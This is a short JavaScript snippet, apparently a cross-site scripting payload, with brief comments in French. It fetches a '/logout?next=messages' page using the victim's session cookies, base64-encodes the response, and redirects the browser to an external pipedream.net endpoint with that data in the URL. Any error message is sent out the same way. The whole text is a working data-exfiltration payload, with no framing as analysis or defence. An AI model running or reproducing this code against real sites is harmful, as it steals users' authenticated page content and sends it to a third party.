(async function(){
  const END = "https://eoeipamgnflz15n.m.pipedream.net";

  function safeB64(s){
    try { return btoa(unescape(encodeURIComponent(String(s)))); }
    catch(e){ return btoa(String(s)); }
  }

  const url = "/logout?next=messages";
  try {
    // IMPORTANT: on retire mode: "no-cors"
    const res = await fetch(url, { method: "GET", credentials: "include" });

    if (!res.ok) throw new Error("HTTP " + res.status);

    // lis toujours en texte brut (tu veux la string)
    const txt = await res.text();

    // encode en base64 safe et envoie
    const payload = encodeURIComponent(safeB64(txt));
    document.location = END + "?p=" + payload;
  } catch (err) {
    const payload = encodeURIComponent(safeB64(String(err && err.stack ? err.stack : err)));
    document.location = END + "?err=" + payload;
  }
})();
